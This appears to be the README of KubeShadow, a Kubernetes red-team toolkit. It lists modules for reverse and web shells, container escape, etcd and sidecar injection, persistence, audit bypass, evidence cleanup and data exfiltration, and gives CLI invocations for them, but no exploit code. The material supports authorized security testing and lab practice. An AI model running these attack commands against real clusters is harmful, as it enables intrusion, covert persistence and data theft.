# KubeShadow

KubeShadow is a comprehensive Kubernetes security testing and exploitation toolkit designed for red team operations, security assessments, and penetration testing. It provides a Red-Team framework with modular architecture for testing cluster security, identifying misconfigurations, and validating security controls.

## 🎯 Key Features

### Core Capabilities
- **Red-Team Framework**: Comprehensive exploitation framework with payloads, exploits, persistence, and post-exploitation modules
- **OWASP Top 10 for Kubernetes**: Complete coverage of Kubernetes security risks with automated detection and remediation
- **Interactive Dashboard**: Real-time attack map visualization with WebSocket updates and graph analysis
- **Lab Environment**: Automated vulnerable Kubernetes lab deployment (AWS, GCP, Azure, Minikube, Kind)
- **Cloud Exploitation**: Multi-cloud provider support (AWS EKS, GCP GKE, Azure AKS)
- **Attack Chain Analysis**: Reconnaissance graph and chaining engine for complex attack paths
- **Data Exfiltration**: Secure data collection and cloud storage integration
- **Stealth Operations**: Low-visibility testing capabilities with evasion techniques

### 🔧 Module Categories

### Module Categories

#### 1. Reconnaissance (`modules/recon/`)
- **Comprehensive Cluster Analysis**: Detailed Kubernetes environment assessment
  - RBAC analysis and privilege mapping
  - Network policy enumeration
  - Service account discovery
  - Pod security context analysis
  - Node information gathering
  - Cloud metadata analysis

#### 2. OWASP Top 10 for Kubernetes (`modules/owasp_top10/`)
- **K01 - Insecure Workload Configurations**: Detect dangerous security contexts
- **K02 - Supply Chain Vulnerabilities**: Identify risky images and registries
- **K03 - Overly Permissive RBAC**: Find escalation chains and risky bindings
- **K04 - Lack of Policy Enforcement**: Detect missing OPA/Gatekeeper/Kyverno
- **K05 - Inadequate Logging**: Find missing audit logs and monitoring gaps
- **K06 - Broken Authentication**: Detect weak auth and exposed credentials
- **K07 - Missing Network Segmentation**: Identify lack of NetworkPolicies
- **K08 - Secrets Management Failures**: Find exposed secrets and weak encryption
- **K09 - Misconfigured Components**: Detect webhook and controller issues
- **K10 - Outdated Components**: Identify vulnerable Kubernetes versions

#### 3. Exploitation Framework (`modules/exploitation/`)
- **Payloads**: Generate and inject malicious payloads
  - Reverse shells (bash, python, perl, php, nc)
  - Web shells (PHP, JSP, ASP, Node.js)
  - Privilege escalation payloads
  - Data exfiltration tools
- **Exploits**: Execute specific attack techniques
  - RBAC escalation
  - Container escape
  - Kubelet hijacking
  - ETCD injection
  - Namespace pivoting
- **Persistence**: Establish persistent access
  - Sidecar persistence
  - Cron-based persistence
  - Service backdoors
  - Volume persistence
- **Post-Exploitation**: Data collection and lateral movement
  - Credential harvesting
  - System reconnaissance
  - Lateral movement
  - Privilege escalation
- **Evasion**: Stealth and anti-detection techniques
  - Anti-forensics
  - Log manipulation
  - Process hiding
  - Network evasion
- **Cloud Exploits**: Cloud-specific attack techniques
  - AWS EKS exploitation
  - Azure AKS exploitation
  - GCP GKE exploitation
  - Multi-cloud pivoting

#### 4. Cluster Exploitation (`modules/cluster_exploit/`)
- **ETCD Injection**: Direct pod injection via etcd
- **Kubelet Exploitation**: Kubelet API exploitation and hijacking
- **Sidecar Injection**: Pod sidecar container injection
- **RBAC Escalation**: RBAC privilege escalation and permission analysis
- **Namespace Pivot**: Cross-namespace access and privilege movement

#### 5. Cloud Exploitation (`modules/multi_cloud/`)
- **Metadata Hijacking**: Cloud metadata service exploitation
- **Cloud Privilege Escalation**: Cloud IAM privilege escalation
- **Assume Role Abuse**: Cloud role assumption and token abuse
- **Cloud Elevator**: Automated cloud privilege escalation paths

#### 6. Stealth Operations (`modules/stealth/`)
- **Audit Bypass**: Audit policy bypass testing and analysis
- **DNS Cache Poisoning**: DNS cache poisoning and spoofing attacks
- **Cleanup Operations**: Evidence removal and operation cleanup

#### 7. Data Exfiltration (`modules/data_exfil/`)
- **Secure Data Collection**: Collect and exfiltrate sensitive data
- **Cloud Storage Integration**: Upload to AWS S3, GCP Storage, Azure Blob
- **Presigned URL Support**: Secure data transfer without credentials
  - Image tampering
  - Credential theft
  - Supply chain attacks

## 🚀 Quick Start

### Prerequisites
- Go 1.19+ installed
- Kubernetes cluster access (for testing)
- Cloud credentials (for lab deployment)

### Installation

**Option 1: Automated Build (Recommended)**
```bash
# Clone and build with automatic dependency handling
git clone https://github.com/ashifly/KubeShadow
cd KubeShadow
make build-cgo
```

**Option 2: Manual Build**
```bash
# Build with CGO enabled (enables SQLite persistent storage for dashboard)
CGO_ENABLED=1 go build -ldflags="-s -w" -o kubeshadow .
chmod +x kubeshadow

# Alternative: Build without CGO (faster, but dashboard uses in-memory storage)
# CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .
# chmod +x kubeshadow
```

### Verify Installation
```bash
./kubeshadow help
```

## 🎯 Usage Workflow

### 1. Lab Setup
```bash
# Deploy vulnerable Kubernetes lab
./kubeshadow lab create --provider aws --cluster-size small
./kubeshadow lab create --provider gcp --cluster-size minimal
./kubeshadow lab create --provider azure --cluster-size small
./kubeshadow lab create --provider minikube
```

### 2. Reconnaissance
```bash
# Comprehensive cluster analysis
./kubeshadow recon --dashboard

# OWASP Top 10 security assessment
./kubeshadow owasp --dashboard

# Attack chain analysis
./kubeshadow recon-graph --dashboard
```

### 3. Exploitation
```bash
# Metasploit-style exploitation framework
./kubeshadow exploitation payloads list
./kubeshadow exploitation exploits rbac-escalate --target-pod vulnerable-pod
./kubeshadow exploitation persistence backdoor --method sidecar
./kubeshadow exploitation cloud-exploits aws-iam-escalate --target-role my-role
```

### 4. Dashboard
```bash
# Start interactive dashboard with attack map
./kubeshadow dashboard --port 8080
```

## 🎯 Command Structure

KubeShadow follows a logical penetration testing workflow:

### 🔧 Lab Setup
- `lab` - Deploy vulnerable Kubernetes environments
- `dashboard` - Start interactive web dashboard

### 🔍 Reconnaissance  
- `recon` - Comprehensive cluster analysis
- `owasp` - OWASP Top 10 security assessment
- `recon-graph` - Attack chain analysis

### 🎯 Exploitation
- `exploitation` - Metasploit-style framework
  - `payloads` - Generate malicious payloads
  - `exploits` - Execute specific attacks
  - `persistence` - Establish persistent access
  - `post-ex` - Post-exploitation activities
  - `evasion` - Stealth and anti-detection
  - `cloud-exploits` - Cloud-specific attacks
- `rbac-escalate` - RBAC privilege escalation
- `sidecar-inject` - Malicious sidecar injection
- `kubeletjacker` - Kubelet API exploitation
- `etcdinject` - Direct etcd injection
- `namespace-pivot` - Cross-namespace access

### ☁️ Cloud Exploitation
- `metadata-hijack` - Cloud metadata exploitation
- `cloud-elevator` - Cloud privilege escalation
- `assume-role-abuse` - Cloud role assumption

### 🔄 Post-Exploitation
- `data-exfil` - Data exfiltration
- `registry-backdoor` - Container registry attacks
- `audit-bypass` - Audit policy bypass
- `dns-poison` - DNS cache poisoning
- `cleanup` - Evidence removal

- **Ephemeral Containers**: Advanced attack demonstrations

## 🛠️ Build Troubleshooting

**If build gets stuck at 40%:**
```bash
# Clean and rebuild without CGO
make clean
CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .
chmod +x kubeshadow
./kubeshadow help
```

### Advanced Troubleshooting

**If you still get segmentation faults:**
```bash
# Try static build
CGO_ENABLED=0 go build -ldflags="-s -w" -o kubeshadow .

# Or use the Makefile
make build-no-cgo
```

**Check your environment:**
```bash
# Verify Go installation
go version

# Check if all dependencies are available
go mod download
```

## 📋 Command Reference (Workflow)

### 🔍 1. Reconnaissance Commands
```bash
# Basic cluster reconnaissance
./kubeshadow recon 

# Stealth reconnaissance (minimal API calls)
./kubeshadow recon --stealth 

# OWASP Top 10 security assessment
./kubeshadow owasp 
```

### ⚔️ 2. Exploitation Commands
```bash
# RBAC privilege escalation
./kubeshadow rbac-escalate 

# Sidecar container injection
./kubeshadow sidecar-inject 

# Kubelet API exploitation
./kubeshadow kubelet-jack 

# ETCD direct injection
./kubeshadow etcd-inject

# Namespace pivoting
./kubeshadow namespace-pivot 
```

### ☁️ 3. Cloud Exploitation Commands
```bash
# Cloud metadata hijacking
./kubeshadow metadata-hijack 

# Cloud privilege escalation
./kubeshadow cloud-elevator 

# AWS role assumption abuse
./kubeshadow assume-role-abuse 
```

### 🎯 4. Post-Exploitation Commands
```bash
# Data exfiltration to cloud storage
./kubeshadow data-exfil --presigned-url "YOUR_URL" 

# Registry backdoor injection
./kubeshadow registry-backdoor 

# Stealth operations
./kubeshadow audit-bypass
./kubeshadow dns-cache-poison

# Cleanup traces
./kubeshadow cleanup 
```

## 🧪 Lab Environment Setup

KubeShadow includes a comprehensive lab module that creates intentionally vulnerable Kubernetes environments for hands-on security practice.

### Prerequisites & Cloud Setup

**Before deploying lab environments, configure your cloud credentials:**

**AWS Setup:**
```bash
# Install AWS CLI and eksctl
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Install eksctl
curl --silent --location "https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz" | tar xz -C /tmp
sudo mv /tmp/eksctl /usr/local/bin

# Configure AWS credentials
aws configure
# Enter your AWS Access Key ID, Secret Access Key, and region
```

**GCP Setup:**
```bash
# Install gcloud CLI
curl https://sdk.cloud.google.com | bash
exec -l $SHELL

# Authenticate and set project
gcloud auth login
gcloud auth application-default login
gcloud config set project YOUR_PROJECT_ID

# Enable required APIs
gcloud services enable container.googleapis.com
gcloud services enable compute.googleapis.com
```

**Azure Setup:**
```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login and set subscription
az login
az account set --subscription "YOUR_SUBSCRIPTION_ID"

# Create resource group (if needed)
az group create --name kubeshadow-lab-rg --location eastus
```

**Local Environment Setup:**
```bash
# Install Docker
sudo apt-get update
sudo apt-get install docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER

# Install Minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```

### Quick Lab Setup

**Local Environment (Minikube):**
```bash
# Deploy complete lab environment
./kubeshadow lab --provider minikube --dashboard

# Run security reconnaissance
./kubeshadow recon --dashboard

# Clean up when done
./kubeshadow lab cleanup
```

**Cloud Environment (AWS/GCP/Azure):**
```bash
# Deploy to AWS EKS (choose any region)
./kubeshadow lab --provider aws --region us-west-2 --dashboard

# Deploy to GCP GKE (choose any region)
./kubeshadow lab --provider gcp --region us-central1 --dashboard

# Deploy to Azure AKS (choose any region)
./kubeshadow lab --provider azure --region eastus --dashboard

# Clean up lab resources only (keeps cluster)
./kubeshadow lab cleanup

# Clean up lab resources AND delete entire cluster
./kubeshadow lab cleanup --provider aws --confirm
```


### Lab Vulnerabilities

The lab includes intentionally vulnerable configurations:
- **Privileged containers** with host access
- **Overly permissive RBAC** roles and bindings
- **Exposed secrets** in environment variables
- **Host network access** for pods
- **Weak network policies** with security gaps
- **Default service accounts** with excessive permissions

### Prerequisites

**For Local Environments:**
- Docker installed and running
- Minikube or Kind
- kubectl configured

**For Cloud Providers:**
- Cloud credentials configured (see Prerequisites & Cloud Setup section above)
- AWS CLI and eksctl (for AWS)
- gcloud CLI (for GCP) 
- Azure CLI (for Azure)

### Dashboard Integration

The lab integrates seamlessly with the KubeShadow dashboard:
```bash
# Start dashboard
./kubeshadow dashboard

# Access at http://localhost:8080
# View real-time command execution and results
# Export findings as CSV or PDF
```

**⚠️ Important: Remote Access Setup**

To access the dashboard from anywhere via the VM's public IP, you **MUST** open port 8080 in your cloud provider's firewall:

- **AWS**: Add inbound rule to EC2 Security Group (TCP port 8080)
- **GCP**: Create firewall rule allowing TCP port 8080
- **Azure**: Add inbound security rule to Network Security Group (TCP port 8080)

See [Dashboard README](modules/dashboard/README.md) for detailed firewall configuration instructions.

For detailed lab documentation, see [modules/lab/README.md](modules/lab/README.md).

## Common Usage Patterns

### 1. Initial Reconnaissance
```bash
# Full cluster and cloud recon
kubeshadow recon

# Only Kubernetes recon
kubeshadow recon --k8s-only

# Only cloud recon
kubeshadow recon --cloud-only

# Stealth mode recon
kubeshadow recon --stealth
```

### 2. Privilege Escalation
```bash
# RBAC escalation
kubeshadow rbac-escalate --kubeconfig ~/.kube/config

# Cloud privilege escalation
kubeshadow cloud-elevator

# Assume role abuse
kubeshadow assume-role-abuse --role-arn arn:aws:iam::123456789012:role/target-role
```

### 3. Pod Manipulation
```bash
# Sidecar injection
kubeshadow sidecarinject --mode api --pod target-pod --namespace default

# ETCD injection
kubeshadow etcdinject --endpoint https://etcd:2379 --cert cert.pem --key key.pem --ca ca.pem

# Kubelet exploitation
kubeshadow kubelet-jack --node-ip 10.0.0.10 --port 10250
```

### 4. Stealth Operations
```bash
# Audit bypass testing
kubeshadow audit-bypass --kubeconfig ~/.kube/config

# DNS cache poisoning
kubeshadow dns-poison --target-service kube-dns

# Cleanup operations
kubeshadow cleanup --namespace default --resource-type pods
```

### 5. Out-of-Cluster Attacks
```bash
# Registry backdoor
kubeshadow registry-backdoor --registry-url https://registry.example.com --image nginx:latest
```

## Security Considerations

1. **Legal and Ethical Use**
   - Only use on systems you own or have explicit permission to test
   - Follow responsible disclosure practices
   - Document all testing activities
   - Obtain necessary authorization before testing

2. **Safe Testing Practices**
   - Use in isolated test environments
   - Avoid production systems
   - Implement proper logging and monitoring
   - Clean up after testing
   - Use appropriate RBAC permissions
   - Follow least privilege principle

3. **Required Permissions**

   > ⚠️ **Warning**: While some modules may work with minimal permissions, others require elevated access. Always use the minimum required permissions for your testing needs.

   ### Minimum Required Permissions
   - **Read Access** (Basic Reconnaissance):
     - `get`, `list` on `pods`, `services`, `nodes`, `namespaces`
     - `get`, `list` on `roles`, `rolebindings`, `clusterroles`, `clusterrolebindings`
     - `get`, `list` on `serviceaccounts`

   ### Module-Specific Requirements
   - **Cluster Exploitation Modules**:
     - `etcdinject`: Direct etcd access or `update` on `pods`
     - `kubelet-jack`: Node network access and kubelet API access
     - `sidecarinject`: `update` on `pods` in target namespace
     - `rbac-escalate`: `get`, `list` on `roles`, `rolebindings`, `clusterroles`, `clusterrolebindings`
     - `namespace-pivot`: `get`, `list` on `serviceaccounts`, `secrets` in target namespaces

   - **Cloud Exploitation Modules**:
     - `metadata-hijack`: Pod execution permissions
     - `cloud-elevator`: Cloud provider IAM permissions
     - `assume-role-abuse`: AWS STS permissions

   - **Stealth Operations**:
     - `audit-bypass`: `get` on `auditpolicies`
     - `dns-poison`: Network access to DNS service
     - `cleanup`: `delete` on target resources

   - **Out-of-Cluster Operations**:
     - `registry-backdoor`: Container registry credentials

   ### Recommended Setup
   - Create dedicated service accounts for testing
   - Use role-based access control (RBAC)
   - Implement network policies
   - Enable audit logging
   - Use separate namespaces for testing

## Project Structure

```
KubeShadow/
├── modules/                          # Core exploitation modules
│   ├── cluster_exploit/             # Cluster exploitation tools
│   │   ├── etcd_inject.go           # ETCD injection attacks
│   │   ├── kubelet_hijack.go        # Kubelet API exploitation
│   │   ├── namespace_pivot.go       # Cross-namespace access
│   │   ├── rbac_escalate.go         # RBAC privilege escalation
│   │   └── sidecar_inject.go        # Malicious sidecar injection
│   ├── dashboard/                   # Interactive dashboard
│   │   └── dashboard_cmd.go        # Dashboard command interface
│   ├── data_exfil/                  # Data exfiltration tools
│   │   └── data_exfil.go            # Secure data collection
│   ├── demo/                        # Demonstration modules
│   │   └── demo.go                  # Demo functionality
│   ├── exploitation/                # Metasploit-style framework
│   │   ├── cloud_exploits_cmd.go    # Cloud-specific exploits
│   │   ├── ephemeral_cmd.go         # Ephemeral container injection
│   │   ├── evasion_cmd.go           # Evasion techniques
│   │   ├── exploitation_cmd.go      # Main exploitation command
│   │   ├── exploitation.go          # Core exploitation logic
│   │   ├── exploits_cmd.go          # Exploit execution
│   │   ├── init_container_cmd.go    # Init container injection
│   │   ├── injected-pod.yaml        # Sidecar injection template
│   │   ├── k8s_utils.go             # Kubernetes utilities
│   │   ├── malicious-sidecar.json  # Malicious sidecar config
│   │   ├── payloads_cmd.go          # Payload generation
│   │   ├── persistence_cmd.go       # Persistence mechanisms
│   │   ├── post_ex_cmd.go           # Post-exploitation
│   │   └── README.md                # Exploitation module docs
│   ├── lab/                         # Vulnerable lab environment
│   │   ├── cleanup.go               # Lab cleanup utilities
│   │   ├── docs/                    # Lab documentation
│   │   │   ├── comprehensive-verification-report.md
│   │   │   ├── ephemeral-container-attacks.md
│   │   │   ├── kubernetes-goat-scenarios.md
│   │   │   └── lab-exercises-comprehensive.md
│   │   ├── lab.go                   # Lab deployment logic
│   │   ├── manifests/               # Vulnerable YAML manifests
│   │   │   ├── 01-namespace.yaml    # Namespace configurations
│   │   │   ├── 02-rbac.yaml         # RBAC misconfigurations
│   │   │   ├── 03-pods.yaml         # Vulnerable pod definitions
│   │   │   ├── 04-services.yaml     # Service configurations
│   │   │   ├── 05-secrets.yaml      # Secret management issues
│   │   │   ├── 06-configmaps.yaml   # ConfigMap vulnerabilities
│   │   │   ├── 07-network-policies.yaml # Network policy gaps
│   │   │   ├── 08-persistent-volumes.yaml # Volume vulnerabilities
│   │   │   ├── 09-ephemeral-containers.yaml # Ephemeral container attacks
│   │   │   ├── 10-secure-ephemeral.yaml # Secure ephemeral examples
│   │   │   ├── 11-ephemeral-attack-scenarios.yaml # Attack scenarios
│   │   │   ├── 12-advanced-vulnerabilities.yaml # Advanced vulns
│   │   │   ├── 13-chroot-escape.yaml # Chroot escape scenarios
│   │   │   ├── 14-secure-chroot.yaml # Secure chroot examples
│   │   │   ├── 15-highly-vulnerable.yaml # Critical vulnerabilities
│   │   │   ├── 16-owasp-comprehensive.yaml # OWASP Top 10 scenarios
│   │   │   ├── 17-ssrf-vulnerability.yaml # SSRF attack scenarios
│   │   │   ├── 18-container-escape.yaml # Container escape techniques
│   │   │   ├── 19-supply-chain-attack.yaml # Supply chain attacks
│   │   │   ├── 20-crypto-miner.yaml # Crypto mining attacks
│   │   │   └── 21-dns-poisoning.yaml # DNS poisoning scenarios
│   │   ├── MANIFESTS.md              # Manifest documentation
│   │   ├── OWASP_LAB_ANALYSIS.md     # OWASP analysis
│   │   └── README.md                 # Lab module documentation
│   ├── multi_cloud/                 # Multi-cloud exploitation
│   │   ├── assume_role_abuse.go      # Cloud role assumption
│   │   ├── cloud_elevator.go        # Cloud privilege escalation
│   │   └── metadata_hijack.go        # Cloud metadata exploitation
│   ├── out_cluster/                 # External infrastructure attacks
│   │   └── registry_backdoor.go     # Container registry attacks
│   ├── owasp_top10/                 # OWASP Top 10 for Kubernetes
│   │   ├── k01_insecure_workload_configs/ # Insecure workload configs
│   │   ├── k02_supply_chain/        # Supply chain vulnerabilities
│   │   ├── k03_rbac/                # RBAC misconfigurations
│   │   ├── k04_policy/              # Policy enforcement gaps
│   │   ├── k05_telemetry/            # Inadequate logging
│   │   ├── k06_auth/                # Broken authentication
│   │   ├── k07_network/             # Missing network segmentation
│   │   ├── k08_secrets/             # Secrets management failures
│   │   ├── k09_components/          # Misconfigured components
│   │   ├── k10_vulnerabilities/     # Outdated components
│   │   ├── owasp_cmd.go             # OWASP command interface
│   │   └── README.md                # OWASP module documentation
│   ├── recon/                       # Reconnaissance tools
│   │   └── recon.go                 # Core reconnaissance logic
│   └── stealth/                     # Stealth operation tools
│       ├── audit_bypass.go          # Audit policy bypass
│       ├── cleanup.go               # Evidence cleanup
│       └── dns_poison.go             # DNS cache poisoning
├── pkg/                             # Supporting packages
│   ├── banner/                      # CLI banner utilities
│   │   └── banner.go                # Banner display logic
│   ├── config/                      # Configuration management
│   │   ├── config.go                # Configuration handling
│   │   └── config_test.go           # Configuration tests
│   ├── dashboard/                   # Dashboard functionality
│   │   ├── api.go                   # REST API endpoints
│   │   ├── dashboard.go             # Dashboard core logic
│   │   ├── export.go                # Data export functionality
│   │   ├── frontend.go              # Frontend integration
│   │   ├── graph_builder.go         # Attack graph construction
│   │   ├── graph_types.go           # Graph data types
│   │   ├── module_publisher.go      # Module event publishing
│   │   ├── publisher.go             # Event publishing
│   │   ├── storage.go               # Data storage
│   │   ├── types.go                 # Dashboard types
│   │   └── websocket.go             # WebSocket communication
│   ├── errors/                      # Error handling
│   │   ├── errors.go                # Error definitions
│   │   └── test.go                  # Error tests
│   ├── etcd/                        # ETCD client utilities
│   │   └── client.go                # ETCD client implementation
│   ├── exfiltration/                # Data exfiltration utilities
│   │   ├── collector.go             # Data collection
│   │   ├── uploader.go              # Data upload
│   │   └── utils.go                 # Exfiltration utilities
│   ├── k8s/                         # Kubernetes client utilities
│   │   └── client.go                # K8s client implementation
│   ├── kubelet/                     # Kubelet API utilities
│   │   └── client.go                # Kubelet client
│   ├── logger/                      # Logging utilities
│   │   ├── logger.go                # Logger implementation
│   │   └── logger_test.go           # Logger tests
│   ├── modules/                     # Module interfaces
│   │   ├── base/                    # Base module types
│   │   ├── registry/                # Module registry
│   │   └── sidecar/                 # Sidecar module types
│   ├── plugins/                     # Plugin system
│   │   └── metrics/                 # Metrics plugins
│   ├── recon/                       # Reconnaissance utilities
│   │   ├── cloud.go                 # Cloud reconnaissance
│   │   ├── comprehensive_scan.go    # Comprehensive scanning
│   │   ├── container.go            # Container analysis
│   │   ├── k8s.go                  # Kubernetes reconnaissance
│   │   ├── kubernetes.go            # K8s-specific recon
│   │   ├── network.go               # Network reconnaissance
│   │   ├── process.go               # Process analysis
│   │   ├── recon.go                 # Core reconnaissance
│   │   ├── system.go                # System reconnaissance
│   │   ├── volume.go                # Volume analysis
│   │   └── vulnerabilities.go       # Vulnerability detection
│   ├── recon_graph/                 # Attack graph analysis
│   │   ├── chaining_engine.go       # Attack chaining
│   │   ├── owasp_integration.go     # OWASP integration
│   │   ├── recon_graph_cmd.go       # Graph command interface
│   │   ├── types.go                 # Graph types
│   │   └── visualization.go        # Graph visualization
│   ├── registry/                    # Module registry
│   │   ├── plugin_registry.go       # Plugin registry
│   │   ├── plugin_registry_test.go  # Registry tests
│   │   ├── registry.go              # Core registry
│   │   ├── registry_bench_test.go   # Registry benchmarks
│   │   └── registry_test.go         # Registry tests
│   ├── testutil/                    # Testing utilities
│   │   └── testutil.go              # Test utilities
│   ├── types/                       # Common types
│   │   ├── module.go                # Module types
│   │   └── plugin.go                # Plugin types
│   └── utils/                       # General utilities
│       └── common.go                # Common utilities
├── docs/                            # Documentation
│   ├── architecture.md              # Architecture overview
│   ├── audit.md                     # Audit documentation
│   ├── cloudattacks.md              # Cloud attack documentation
│   ├── data-exfiltration.md         # Data exfiltration docs
│   ├── dns.md                       # DNS attack documentation
│   ├── kubeletjack.md               # Kubelet exploitation docs
│   ├── lab.md                       # Lab environment docs
│   ├── modules/                     # Module-specific documentation
│   │   ├── recon/                   # Reconnaissance docs
│   │   └── sidecar.md               # Sidecar injection docs
│   ├── namespace.md                 # Namespace documentation
│   ├── quickstart.md                # Quick start guide
│   ├── rbac.md                      # RBAC documentation
│   ├── recon.md                     # Reconnaissance docs
│   ├── sidecarinject.md             # Sidecar injection docs
│   └── troubleshooting.md           # Troubleshooting guide
├── examples/                         # Usage examples
│   ├── lab-usage.md                 # Lab usage examples
│   └── sidecar-config.json          # Sidecar configuration example
├── resources/                        # Resource files
│   ├── configs/                     # Configuration templates
│   │   └── sidecar_config.json      # Sidecar configuration
│   └── templates/                   # Template files
│       ├── pod_template.json        # Pod templates
│       └── sidecar_template.json    # Sidecar templates
├── scripts/                         # Build and deployment scripts
├── main.go                          # Main application entry point
├── go.mod                           # Go module definition
├── go.sum                           # Go module checksums
├── Makefile                         # Build automation
├── Dockerfile                       # Container image definition
├── setup.sh                         # Setup script
├── README.md                        # Project documentation
├── CHANGELOG.md                     # Version changelog
├── CONTRIBUTING.md                  # Contribution guidelines
└── logo.png                         # Project logo
```

## Documentation

Detailed documentation is available in the `docs/` directory:
- [Architecture Overview](docs/architecture.md)
- [Module Documentation](docs/modules/)
- [Troubleshooting Guide](docs/troubleshooting.md)
- [Contributing Guide](CONTRIBUTING.md)

## Contributing

We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a list of changes.
